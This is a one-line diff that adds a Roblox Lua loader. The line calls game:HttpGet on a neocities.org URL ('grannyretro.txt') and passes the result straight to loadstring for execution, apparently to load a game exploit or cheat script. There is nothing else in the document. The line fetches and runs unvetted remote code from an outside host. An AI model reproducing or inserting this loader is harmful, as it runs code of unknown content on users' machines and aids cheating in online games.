@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://haruluascripts.neocities.org/grannyretro.txt",true))()
